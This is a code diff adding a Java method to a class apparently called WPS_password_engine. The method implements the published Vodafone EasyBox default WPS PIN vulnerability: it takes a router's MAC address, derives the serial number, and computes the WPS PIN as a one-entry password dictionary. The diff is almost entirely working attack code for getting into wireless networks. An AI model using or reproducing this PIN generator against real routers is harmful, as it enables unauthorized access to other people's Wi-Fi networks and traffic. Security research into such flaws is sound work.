@@ -302,4 +302,65 @@ public class WPS_password_engine
 		return new PasswordDictionary("dlink_wps",result,"");
 	}
 	//-----------------------------------------------------------------------------------------------------------
+	public static PasswordDictionary		easybox(Mac bssid)
+	{
+		//https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20130805-0_Vodafone_EasyBox_Default_WPS_PIN_Vulnerability_v10.txt
+		String bssid_string=bssid.get_mac("",true);
+		
+		//derived serial number
+		String mac_part		=bssid_string.substring(8,12);
+		int mac_part_hex	=Integer.parseInt(mac_part,16);
+		String mac_part_dec	=Integer.toString(mac_part_hex,10);
+		for(int i=mac_part_dec.length();i<5;i++)
+		{
+			mac_part_dec="0"+mac_part_dec;
+		}
+		//String serial_number = "R----"+mac_part_dec;
+		
+		int mac_int[]=new int[12];
+		for(int i=0;i<bssid_string.length();i++)
+		{
+			String s=""+bssid_string.charAt(i);
+			mac_int[i]=Integer.parseInt(s,16);
+		}
+		
+		int sn_int[]=new int[10];
+		for(int i=0;i<5;i++)
+		{
+			sn_int[i]=0;
+		}
+		for(int i=0;i<5;i++)
+		{
+			String s=""+mac_part_dec.charAt(i);
+			sn_int[i+5]=Integer.parseInt(s,10);
+		}
+		int hpin[]=new int[7];
+		for(int i=0;i<7;i++)
+		{
+			hpin[i]=0;
+		}
+		
+		int k1	=(sn_int[6] + sn_int[7] + mac_int[10] + mac_int[11]) & 0xF;
+		int k2	=(sn_int[8] + sn_int[9] + mac_int[8]  + mac_int[9]) & 0xF;
+		hpin[0] = k1 ^ sn_int[9];
+		hpin[1] = k1 ^ sn_int[8];
+		hpin[2] = k2 ^ mac_int[9];
+		hpin[3] = k2 ^ mac_int[10];
+		hpin[4] = mac_int[10] ^ sn_int[9];
+		hpin[5] = mac_int[11] ^ sn_int[8];
+		hpin[6] = k1 ^ sn_int[7];
+		int pin=(int) ((int)	hpin[0] *Math.pow(16,6)
+						+hpin[1]*Math.pow(16,5)
+						+hpin[2]*Math.pow(16,4)
+						+hpin[3]*Math.pow(16,3)
+						+hpin[4]*Math.pow(16,2)
+						+hpin[5]*Math.pow(16,1)
+						+hpin[6]*Math.pow(16,0));
+		pin=pin % 10000000;
+		int checksum=WPS_password_engine.wps_checksum(pin);
+		ArrayList<String> words=new ArrayList<String>();
+		words.add(Integer.toString(pin)+Integer.toString(checksum));
+		return new PasswordDictionary("easybox",words,"");
+	}
+	//-----------------------------------------------------------------------------------------------------------	
 }
